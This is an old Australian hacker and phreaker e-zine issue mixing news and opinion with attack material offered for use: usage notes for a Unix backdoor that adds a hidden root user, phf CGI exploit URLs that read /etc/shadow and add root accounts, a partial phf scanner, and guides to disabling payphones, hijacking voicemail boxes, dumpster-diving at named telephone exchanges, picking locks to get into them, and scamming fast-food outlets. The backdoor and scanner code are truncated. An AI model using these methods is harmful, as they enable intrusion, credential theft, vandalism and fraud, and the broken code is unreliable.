  1.1 - Introduction

  Welcome to the second issue of Morpheus. I recieved lots of praise from the
  first issue, so i hope the second and following do the same :) Many people 
  have asked me about the different versions that i mentioned in the first
  issue, but i have decided just to do one full issue, and release to the
  masses whatever i want. Although a number of people have told me that FAST
  no longer works from a payfone.. i hope this is not due to Morpheus, and if
  it happens again, such information wont be released.. sorry.

  Morpheus will not be released on a set date, it will be released when I 
  receive enough info to compile another issue. If u have something u would 
  like printed please send it in.. or if i have contained something in a 
  previous issue that u feel u should have credit for, or dont like, please!!
  let me know and i will make the due alterations.

  Enjoy the rest of the e-zine.

  1.2 - About ALOC / Morpheus

  ALOC started off as a group, but it didnt work out. So i went back to my
  original idea.. and that was to create a place where australian hackers and
  phreakers could meet together, trade information, and learn. So that is
  what ALOC has become, a place to get information and talk to others of
  similar interests. In general it has become a Network.

  Morpheus is part of the above, and it compiles alot of what would be 
  little texts into one large one, which would otherwise be quite time 
  consuming to write seperate small files on.

  This magazine in its electronic form can not be sold without prior 
  permission from the authors. It also may not be spread via any sort of 
  Public Domain, Shareware or CD-ROM package.

  2.1 - ASIO Gain More Power

  The Australian Government, being the techno-brainless institution that it 
  is, is trying to push a bill through parliament that will allow ASIO 
  (Australian Security Intelligence Organisation) to have greater power in 
  the areas of intelligence gathering in Australia. This will include greater
  freedom to hack into private computers, copy files and alter data as well 
  being able to legally place tracking devices on peoples and private 
  property.

  It is proposed that the new bill will be for "Better security leading up to
  the Sydney 2000 Olympics" but we all know that once the Olympics are gone,
  the bill will still be here to stay.

  The Federal Attorney-General, Daryl Williams, stated that the bill will 
  permit security officers to hack into a computer if "there are reasonable 
  grounds for believing that access to data held in a particular computer 
  (the target computer) will substantially assist the collection of 
  intelligence that is important in relation to security."

  The bill allows ASIO to employ intelligence-gathering methods not 
  previously allowed under the Australian Security Intelligence Act, 1979.
  This includes extending the period that a warrant applies for, now up to
  six months. It also allows ASIO to use tracking devices, not specified by
  Mr. Williams (wonder why!), as well as giving it powers to enter property,
  and alter objects to install tracking devices. The bill also allows ASIO to
  enter a property to remove devices, while the warrant is in force, during a
  28-day period after the warrant is enforced and if the device is not
  recovered during that period, or in Mr. William's words, "at the earliest
  possible time".

  An access warrant will permit ASIO to use computers, phone companies and 
  telecommunications equipment to gain access to a remote or networked 
  computer. Once in, the ASIO hackers will be allowed to copy, add, delete or
  alter any data in the target computer that is relevant to the security 
  matter.

  When they leave security officers will be allowed to cover up the fact that
  they hacked into the system and will not be subject to the Crimes Act, 
  which forbids computer hacking in Australia.

  Other powers include the authority to examine an article being delivered by
  a delivery service provider, to conduct investigations for the collection 
  of foreign intelligence in Australia, including the use of human agents. 
  "Access to open source material, e.g. Internet and media, may also be used 
  to supplement other material," talking about online monitoring, search 
  engine use and filters.

  ASIO was established in 1949 to protect the Commonwealth from acts of 
  sabotage from internal or external threats but as the clock ticks over 
  towards 2000 it looks to be lagging behind in its primary job and although
  measures are being taken now to secure Australia for the coming of the 
  Olympics, it looks just like a disguised version of Big Brother, attempting
  to keep a watchful eye on the Australian cybercommunity.

  ------------------

  3.1 - Hacker Types

  Most e-zine / sites have a list of the different types of hacker out there,
  so here is mine. This is not the definative list, or the be all and end all
  list. These are just my opinions / views, and they will all be read, and
  thought about differently by each person, since everyone has their own
  meaning for what a 'hacker' really is. Alot of them overlap.. and it just 
  makes for interesting reading... if anything? 

  Which one are u?

  Lamer: general colective term for the-i-saw-hacker-the-movie-and-wanna-be-
  one-too, the-script-kiddie, the-so-called-1337-hacker, and any others that
  fit.

  The-i-saw-hackers-the-movie-and-wanna-be-one-too: 7h3y 741k l1k3 7h15 (they
  talk like this) .. or LiKe ThiZ.. since thats how they typed in the movie.
  All they do / wanna know is how to nuke their friends, flood channels, 
  email bomb, hack such and such's home page, and take over IRC chans.

  The-script-kiddie: they are above the so-called-1337-hacker, because they
  can actually root boxes, even though they have no idea what they are doing.
  They just run exploits against box after box, and are usually after warez,
  or credit cards. They have a large collection of exploits, and programs
  with BIG, BEAUTIFUL!! shiny Buttons!!!

  The-so-called-1337-hacker: these types go around bragging to every1 how
  'leet' they think they are, and think that they can root every box they
  come across. They bag other hackers non-stop due to their jealousy, since
  they know in actual fact that they couldnt hack a DOS box even if they had
  physical access it it! And when posed with a question, they bullshit around
  the answer, since they dont know it, but they want u to think that they do.

  Hacker-with-a-life-albeit-computer-orientated: these hackers are people
  that usually have girlfriends, and actually 'get out' into the real world
  once in awhile, be it for a new music cd, comic, some new clothes, or more
  than likely computer hard ware :)

  Hacker-with-no-life-whatsoever: they spend all night hacking away, sleep 
  during the day (if at all), and get right back to it at night. They are 
  normally in the top classes in school (chem, calc, etc), but due to their 
  hacking.. they dont do too well at school. They never go out, they have
  never met their friends, and only know them by pseudonyms, and have MAYBE
  had voice contact if they dabbled in phreaking...

  The-real-life-hacker: a hacker who hacks things in everyday life. They put 
  the hacker ethics and tactics into play in real/everyday life. For example,
  they complain how un-efficient the road / traffic light system is. These 
  types are more closely related to the 'old school hacker'. Since that is 
  basically what they are.

  The-REAL-ELITE-Hacker: they can code very efficiently in a language, they
  are the ones who come up with / find all these exploits, and they also
  actually do something for others. They teach. Unlike the so-called-1337
  -hacker when posed with a question, they will answer to the best of their
  ability, and if they cant answer it they will tell you straight out that
  they dont know the answer, and will point you in the right direction,
  instead of bullshitting it. Not many.. IF any of these are around.

  The-Ethical-Hacker: hackers in suits that get paid.

  
  3.2 - Backdoor

  I found the following backdoor on a site somewhere, and there is no credit
  to who wrote it, i have modified the orginal, but i wont call it my own
  (since it is not!). The original only listened on port 550 i think it was..
  I modified it so that the user can specify what port to listen on, and the
  user that is added to the passwd file looks more realistic. And for another
  option i made it so that you can remove the files /etc/hosts.allow and
  /etc/hosts.deny so you can telnet in without having to go through wingates,
  or other means. After modifing the backdoor i found, i noticed that Keen 
  Veracity had already published one which does basically the same thing. 
  (Issue 1, www.legions.org, by jsbach). But the version i had was a lot 
  cleaner.. so  here it is:

  //-------------------------------------------------------------------------
  //  Usage (setup):
  //      # gcc -o backdoor backdoor.c
  //      # ./backdoor <password> <port> &
  //  Usage (using):
  //     telnet to the host (with the port you specified), type the password
  //     (there is no prompt, therefore its less obvious as a backdoor),
  //     and select an option. 
  //
  //   Note: dont use backdoor as the name to compile it to, since if a
  //   process listing is performed.. a process called backdoor looks abit
  //   suss, or if you know how, modify ps, so it doesnt show up backdoor :)
  //
  //  Option 1: adds the user "smithr::0:0:Robert Smith:/root:/bin/bash"
  //  Option 2: copies /etc/hosts.allow to /etc/hostsallow.bak and 
  //            /etc/hosts.deny to /etc/hostsdeny.bak, and touches replaces, 
  //            so u can telnet in..

    }
  }


  3.3 - CGI Exploits
  ----------------------

  Each issue I hope to have a new CGI exploit for you, these can still be
  found on many servers, and most particularily ones that run older versions
  of Apache, with the demo CGI scripts installed.

  CGI - Common Gateway Interface. Using CGI extends the capabilities of a
  server to interpret information from the browser and return information
  based on user input. One of the easiest ways to to break into a machine
  through a CGI program is to try and confuse it by experimenting with the
  input. If the CGI is not robust, it will either crash or do something it
  was not designed to.. 

  Phf
  ---
  
  This is a very old exploit, but Phrost and I have managed to find some 
  ISP's that still have not fixed this gaping hole. So we have started off
  with this one, and it is also very simple to implement. The following is
  only an introduction (hence to push you in the right direction), there are 
  many files out there that delve into phf alot deeper, find them yourself,
  the following gives you enough information to understand why phf is
  exploitable, and how to do it.

  Phf is originally designed to update a phonebook style listing of people.
  As mentioned above, CGI scripts can behave differently by 'confusing' them,
  and phf is easily 'confused' by sending it the newline (0a) character.

  Phf is located in the WWW cgi-bin directory. If it is there, and has 
  permission x, you can use any web browser to read files on the host's
  computer, and save them to your own. Depending on what the httpd server is
  running as, depends on what you can do with phf, eg if it was running as
  root, you can add new users, etc.

  Firstly you must find a site that still has phf installed on their system.
  Unless you want to be typing address's into your browser all your life, 
  Phrost has taken the liberty of writting a phf scanner in REBOL for you all
  (see Appendix I). The above mentioned scanner will be updated and improved
  with each issue. 

  Once you have found a machine that looks like it may be vulnerable, the
  next move is to check to see if phf is still active. Do this by checking
  to see what user it is running under, by typing the following URL into
  your browser:

  http://www.victim.com.au/cgi-bin/phf/?Qalias=x%0aid

  It should return something similar to:

  QUERY RESULTS
  /usr/local/bin/ph -m alias=x id
  uid=65534(nobody) gid=65535(nogroup) groups=65535(nogroup)

  This shows that httpd is running as nobody..

  If you find one that is running as root, you can perform such functions as:
  
  Display the /etc/shadow file (shadow file may be a different name):
  http://www.victim.com.au/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/shadow

  Add a root user:
  http://www.victim.com.au/cgi-bin/phf?Qalias=x%0a/bin/adduser%20username%20
  username%20100%20
  http://www.victim.com.au/cgi-bin/phf?Qalias=x%0a/bin/chuid%20username%0
  http://www.victim.com.au/cgi-bin/phf?Qalias=x%0a/bin/chuid%20root%500

  Even if you dont get root access, make sure you still have a look around
  the system.. Once Phrost and I found an ISP that kept their passwords well
  shadowed except that they kept another copy in a file called auth_users 
  with both usernames and passwords together, and was world readable!

  Be warned though, many ISP's do know about this exploit and have taken
  measures to record foreign IP's that attempt to exploit them (and usually
  display a message such as 'Smile you're on camera') For many of us this
  doesnt matter too much but i thought i would warn you anyway so that when
  your ISP gets mail from one of your attempted tagets... dont blame me.

  4.1 - Exchange Locations (Western Australia)

  The following are a list of exchange locations and descriptions for Western
  Australia. Unfortunately i havent had any submitted for the other states.
  This information is very handy to phreaks.. Telstra can't exactly move the
  exchange, like they can change the numbers we get a hold of :)
  
  The follwing were submitted by Optix:

  Wellington Exchange 
    - 639 Wellington Street, Perth
    - 2 Dumpsters at end of Main driveway just under security camera
    - building is approximately 16-20 storeys high

  Pier Exchange 
    - 98 Pier Street, Perth
    - 1 Wheelie Bin spotted. 1 (possibly 2/3) dumpsters spotted behind 
      corrugated steel gate (easy to jump)
    - approximately 7 stories high. Right next to Red CAT stop #1

  Kelmscott Exchange
    - Albany Highway, Kelmscott
    - 1 wheelie bin outside back enterance. 1 LOCKED Dumpster behind exchange
      (off property)
    - lock for dumpster is around about a 40mm - 60mm padlock, you could get 
      through it with an average size pair of bolt cutters. Also what looks 
      like a big power generator (on property) to the side of the building
      (about the size of a cargo container). Easy access at the rear of the
      building, it's a carpark for Kelmscott Railway Station. You could park
      right next to the dumpster and in front of the wheelie bin.

  The follwing were submitted by Bad Vibez:
  
  Carey Street (Near Catholic School) 
    - a couple of dumpsters, i think, towards the back 
    - there's an empty field backing it, you can't get to it from the highway
      though, and perhaps if you convinently dropped a footy into the
      dumpster from that side, then walked around the front, talked to the
      gatehouse guy, told him that you were getting your footy, you could 
      dumpster the joint. 

  The following were submitted by iMoRtAl

  4.2 - Telstra Employee Levels

  I have written the following based on a variety of sources.

  Telecommunications Officer (previously known as Linesperson)
    They install and maintain external telecommuncations equipment
    (including aerial lines, conduits and cables) and telephone customers'
    premises. These are the people who drive arround in the Telstra cars,
    vans, and wagons. Telstra also hire telecommunications offers on
    contract from other companies, you may have seen unmarked white (always
    white) cars parked near pods, payfones, etc. So when you start noticing
    lots of Telstra vans, remember there are also unmarked white wagons that
    also contain Telstra related equipment ;)
    
    The majority of telecommunications officers work for Telstra and are
    classified as communication officers grades 1 to 6, according to the
    duties they perform. (The higher the number, the more access they have
    to Telstra equipment and facilities.. eg if you have a set of keys that
    have exchange keys on them.. you more than likely stole them from a high
    ranking telecommunication officer, or even a telecommunication
    technician.. see further below).
    
    Grades 1 to 3 may perform the following tasks:
    - help to install transmission lines and equipment at heights on towers
    - operate excavation machinery to provide trenches and install conduits
    - lay and joint underground (metallic and fibre optic) cables for the
      transmission of telephone, television, radio, and computer data, which
      involves work in underground tunnels
    - connect cables in the network between exchanges and customer's premises
    - install telephones and communications equipment (simplex services) at
      customers' premises
    - provision of support for LAN (Local Area Network) systems including the
      establishment, configuration, use, troubleshooting and support for 
      such systems
    - travel by mobile unit to attend to telecommunication difficulties and
      customer complaints, and
    - correct faulty, unearthed or broken lines which may be caused by
      lightning, or damaged by accident or fire. (ED - and phreaks!)

    Grades 4 to 6 with Telstra are mainly supervisory and training positions
    and may perform the following additional tasks:
    - supervise and develop training programs for communications officers at
      lower levels, and
    - operate computer systems which record and store data on maintenance and
      repair of equipment and plant.

  Telecommunications Technician
    They install, operate, maintain ans repair telecommunications and
    broadcasting networks and equipment. Most technicians work for Telstra,
    but as mentioned above, Telstra also hire technicians on contract.
    Telstra technicians are known as telecommunications technical officers
    (TTO). 

    TTO's work both indoors and outdoors, and have considerable contact with
    customers in business or private homes. They may work in telephone
    exchanges, computer and equipment rooms, installation or service depots
    for sustained periods of time. TTO's are ranked from grades 1 to 7, 
    according to the duties they perform.

    Telecommunications technicians may perform the following taks:
    - commission and accept network equipment and the provision of new 
      services
    - ensure the integrity and quality of equipment and circuit installations
    - position and terminate cables, install jumpers, wires, and strappings
    - undertake proof tests such as wire testing, analogue circuit 
      commissioning and power tests
    - assemble, erect, position and label all items of equipment
    - sell telecommunications products
    - provide estimates to customers for installation of equipment
    - install and maintain telephones, PABX and other business communication
      systems (complex services) at customers' premises
    - install, test and carry out restorativeand routine maintenance on all
      types of telecommunications, switching and transmission equipment,
      including telephone exchanges and the public telephone network.
    - carry out, under supervision, modifications to items of equipment
    - analyse system faults with a high degree of diagnostic skill 
    - maintain and adhere to operational procedures and complete appropriate
      documentation
    - assume responsibility for assigned tools, plant and test equipment
      (ED - LMAO!!!)
    - develop and maintain good relations with internal and external
      customers, and
    - operate call tracing facilities when necessary (ED - argh!)
   

  4.3 - Putting A Payfone Out of Order

  I know alot of people once knowing that how to put a payfone out order was
  going to be in Morpheus 2, have sent me an email telling me how to do it, 
  but since my girlfriend was the first to teach me how to do it, here is her
  article.. enjoy!

  Ok...so you want to put a payphone out of order but Phrost and Deicidal 
  won't lend you their precious keys. (hey who needs keys if you're a REAL
  phreaker, right?) To put a X2 payphone (thats what Phrost tells me it is,
  to me its just another fucking phone, no different from the last or the
  next...) out of order you will require: bolt cutters, a soldering iron, 
  gloves, suphuric acid, and lots of brute strength. WRONG! All you need is 
  the little <OK> button and the handset itself! 
  
  Hold down the <OK> button and THEN pick up the handset for just a matter of
  moments - perhaps 3 seconds if that, just until the phone registers - never
  releasing the <OK> button. Then hang up the phone, and MON DIEU! The phone 
  is now out of order! 

  And now that I've had this contribution to the cyber-technology-FUTURE
  age forced out of me, I'm going to dive straight back into the Russian 
  Revolution and immerse myself in HISTORY...

  à bientôt!
  Phrostess; aka NOT a phreaker-hacker-coder-cyberpunk-whatever.


  4.4 - Free Optus Voicemail!

  f0z
  VMB (03) 9220 9828
  f0z1@hotmail.com

  Looking for a free optus voicemail box?
  The exchange here in Melbourne is (03) 9220 XXXX.
  It might be different in other states. Just look in the back of the 
  L-Z white pages for the exchange page and dial a few optus ones till you 
  start getting VMB's.

  Just call up one and if you get a recoring of the optus lady saying 
  leave a message after the beep press * 
  It will ask you for the passcode and the passcode is the number that you
  just dialed.
  i.e box: 9220 3243
  passcode: 9220 3242

  If it doesn't work then try it without the 9 at the start.
  If you call up and get some other guys box then press * twice to get to 
  the login menu. From there dial any number you wish in the 9220XXXX
  exchange. You can spend all night scanning on the one phone call.

  Also, some numbers in the 9221xxxx exchange are fax boxes. Dial a few 
  numbers there until you get a message saying some crap about faxes and use
  the same number/passcode combo as above.
  There ya go
  Have fun

  5.1 - Lock Picking

  The following was taken basically word for word (except the introduction,
  and other comments) from 'Secrets of Lock Picking' by Steven Hampton. For 
  more detailed explanations see the web site section further below.

  Introduction - lock picking can be a VERY useful skill to know, especially
  for a phreak that can't get their hands on that ellusive set of keys. I 
  will only delve into the pin tumbler type lock, since these are the most
  common. After reading this text, you should be into lockers, pod's,
  exchanges, and various other places that u are not supposed to be. By using
  the following technique, Deicidal and I were into all types of padlocks,
  pods, lockers, exchanges,  and through glass sliding doors... Have phun ;)

  How a lock works - as i said before, the most commonly used lock today is 
  the pin tumbler. A series of pins that are divided at certain point must be
  raised to these dividing point in relationship to the separation between 
  the cylinder wall and the shell of the lock by a key cut for that
  particular series of pin divisions. Thus the cylinder can be turned, and 
  the mechanism can be locked or unlocked. (see images m2lkpk1.gif and 
  m2lkpk2.gif)

  Picking - by picking a lock, you simply replace the function of a key with 
  a pick that raises the pins to their 'breaking point', and using a tension 
  wrench you rotate the cylinder to operate the cam at the rear of the lock's
  cylinder to unlock the mechanism.

  Tools - All that is required is a small flathead screwdriver, and a safety
  pin that is used like a 'hook' pick. The last half inch of the screwdriver
  is bent at a 45 degree angle so as to allow easy entry for the saftey pin
  pick. I recommend buying a 12 piece pick set if you are serious about lock
  picking, it makes it a HELL of alot easier (see web sites listed below). 

  How to pick a pin tumbler lock - Without using the tension wrench, slip 
  the pick into the lock. The 'hook' of the pick should be towards the
  tumblers. Try to feel the last tumbler of the lock. When you feel the back
  tumbler, slowly raise it with a slight prying motion of the pick. Release
  it, but keep the pick in the lock on the rear tumbler. Now insert the
  wrench, allowing room for the pick to manipulate all the pins. It should be
  placed at the bottom of the cylinder, apply a gentle clockwise pressure to
  the tension wrench (see images m2lkpk_1.gif and m2lkpk_2.gif to see what it
  looks like.. with a real pick set). Slowly raise the back tumbler with the
  pick, and a minute click will be felt, and heard when it breaks. It will
  loose its springiness when this occurs. Repeat the process with each pin, 
  moving outwards, and eventually the cylinder should turn (see images 
  m2lkpk3.gif, and m2lkpk4.gif). That is all there is to it!

  Web Sites - the above is only intended to be an introduction to lock
  picking, for a more detailed explanation, visit the following sites (the
  MIT guide is one of the best):

  http://home.it.net.au/~hardguy/text/mitguide.pik
    - the famed MIT guide to lock picking!!
  http://www.lock-picks.com/
    - dedicated to just lock picking not like the one below
  http://www.lockpicking.com/
    - contains lots of 'spy' stuff
  http://stronghold.netnation.com/~eclect/locksmith/
    - a 'locksmithing' (same as picking) cource

  5.2 Free Fast Food
  ------------------

  You one of those poor bastards that can't afford to buy a whole meal at
  kfc, HJ's or the like?? and just go for a large chips?? Well heres how u
  can get more of those greasy, krusty chips! I've only done this once at
  KFC, and I've made a scene b4 at MacDonalds, and gotten a whole meal for
  free (trust me, its not worth the embarassment.. but hey.. if i'm a bum, i
  know how to get food!, if u can call it food?)

  What you do, is order a large chips.. got outside, eat half of them.. then
  go back into the store and say something to the effect of 'These chips are
  too salty, and i cant eat them, theyre sickening' the dumb fast food girl
  will probably go and ask the manager what to do.. so u wait.. and they'll
  come back and give u a whole new pack, and ask u if u want salt on them
  this time. (i said yeah, just a LITTLE bit.. and the bitch put a heap on
  again!).

  There u are.. one and a half large chips, for the cost of one :P Dont eat
  em all at once!!!

  PS - always ask for NO ICE !!!

  6.0 -[ Challenge ]-
  -------------------

  6.1 - JavaScript Password Box
  
  As i mentioned in the first issue there will be a challenge for you to try
  before the next one comes out. This first one is a JavaScript Password 
  scheme which I found at fravia's (http://fravia.org, or try 
  http://www.phase-one.com.au/fravia/). To get to this challenge, click on 
  the Cat In The Hat on the page (www.aloc.cc), if you can crack it, you will
  be rewarded with the phone numbers from the payfone log books (Sorry to all
  the phreaks who dont crack.. but this is the only way i can release them
  without them being abused... it makes people actually do something to get
  them).

  If you manage to crack it, please email me a message saying you cracked it
  with the numbers from the page (for proof), and if you don't crack it, also
  send me an email describing the process you used, and how far you got.
  If i get alot of email from people who can't crack it, I will provide 
  hints, and help based on their email in the next issue.. Good Luck!

  7.0 -[ Conclusion ]-
  --------------------

  That's it for another issue. In the first i mentioned that there would be
  some DTMF tunes to play.. well i didnt get any sent in.. and i dont know 
  any.. oh well, u get that. Next issue will have more on Echelon (by Hool),
  another CGI exploit, an explanation of UNIX text editors (sed, grep, etc),
  a detailed explanation of REBOL, and various other pieces of information.
 
  Hope u enjoyed it, AND learned something...

  Appendix I
  ----------

  Due to time, I cant explain this script in more detail. But as mentioned
  above, there will be an article on REBOL in the next issue, and the script
  will also be modified and improved. For now, visit www.rebol.com to get
  the program to run this script, and try learning some it yourself.

  The script works by connecting to the site, and seeing if phf is there.
  If it is, you get the message Found! if not, it displays Not Found. As
  mentioned in the phf article, some sites have put the message 'Smile you're
  on camera' in place of phf, if this is the case, the scanner will still 
  return Found!, you have to go through the list and test the Found! ones
  by hand, to see if they are in fact vulnerable.

  To use this script, just paste your list of domains in between 'sites [' 
  and ']' and alter the statement 'for where 1 5 1 [' to reflect the amount
  of sites in the sites [] list. eg, i have included 5 sites already, if i
  add another to sites [] , i have to alter 'for where 1 5 1 [' to read
  'for where 1 6 1 [' get it? if not, dont bother with it.

  To run, in REBOL, type:
  >>do %phfscn.r

  --- phfscn.r --- cut here ---
  REBOL [
    Title: "phf Scanner"
    Author: "Phrost Byte"
    File: %phfscn.r
    Purpose: {To scan a list of domains for the phf vulnerability.}

  for where 1 5 1 [

    prin ["Searching for " pick sites where " : "]

  ]

  print ["Finished searching."]
